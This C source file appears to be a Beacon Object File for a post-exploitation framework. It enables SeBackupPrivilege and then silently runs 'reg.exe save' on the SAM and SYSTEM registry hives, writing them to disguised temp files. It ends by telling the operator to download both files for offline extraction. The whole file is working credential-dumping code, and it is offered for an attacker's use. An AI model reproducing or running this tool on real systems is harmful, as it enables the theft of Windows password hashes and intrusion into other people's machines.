/*
 * sam_dump.c - Dump SAM and SYSTEM registry hives to disk
 *
 * Requires: Administrator privileges
 * Args:     output_path (string, optional - defaults to %TEMP%\s.tmp)
 */

#include <windows.h>
#define BOF
#include "beacon.h"

/* DFR imports */
DFR(KERNEL32, GetEnvironmentVariableA)
DFR(KERNEL32, CreateProcessA)
DFR(KERNEL32, WaitForSingleObject)
DFR(KERNEL32, CloseHandle)
DFR(ADVAPI32, OpenProcessToken)
DFR(ADVAPI32, LookupPrivilegeValueA)
DFR(ADVAPI32, AdjustTokenPrivileges)
DFR(KERNEL32, GetCurrentProcess)
DFR(KERNEL32, GetLastError)

void go(char* args, int len) {
    datap parser;
    int   out_size = 0;
    char* out_path = NULL;
    char  sam_path[MAX_PATH];
    char  sys_path[MAX_PATH];
    char  cmd_line[512];

    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    BeaconDataParse(&parser, args, len);
    out_path = BeaconDataExtract(&parser, &out_size);

    /* Build output paths */
    if (out_path == NULL || out_size <= 1) {
        char temp[MAX_PATH];
        KERNEL32$GetEnvironmentVariableA("TEMP", temp, MAX_PATH);
        wsprintfA(sam_path, "%s\\s.tmp", temp);
        wsprintfA(sys_path, "%s\\sy.tmp", temp);
    } else {
        wsprintfA(sam_path, "%s\\s.tmp", out_path);
        wsprintfA(sys_path, "%s\\sy.tmp", out_path);
    }

    /* Enable SeBackupPrivilege */
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed: %lu",
                     KERNEL32$GetLastError());
        return;
    }

    if (!ADVAPI32$LookupPrivilegeValueA(NULL, "SeBackupPrivilege", &luid)) {
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue failed: %lu",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    if (KERNEL32$GetLastError() != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges failed: %lu",
                     KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hToken);
        return;
    }

    KERNEL32$CloseHandle(hToken);

    /* Dump SAM hive */
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    wsprintfA(cmd_line, "reg.exe save HKLM\\SAM %s /y", sam_path);

    if (!KERNEL32$CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess (SAM) failed: %lu",
                     KERNEL32$GetLastError());
        return;
    }

    KERNEL32$WaitForSingleObject(pi.hProcess, 30000);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] SAM hive saved to: %s", sam_path);

    /* Dump SYSTEM hive */
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    wsprintfA(cmd_line, "reg.exe save HKLM\\SYSTEM %s /y", sys_path);

    if (!KERNEL32$CreateProcessA(NULL, cmd_line, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess (SYSTEM) failed: %lu",
                     KERNEL32$GetLastError());
        return;
    }

    KERNEL32$WaitForSingleObject(pi.hProcess, 30000);
    KERNEL32$CloseHandle(pi.hProcess);
    KERNEL32$CloseHandle(pi.hThread);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] SYSTEM hive saved to: %s", sys_path);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Download both files for offline extraction.");
}
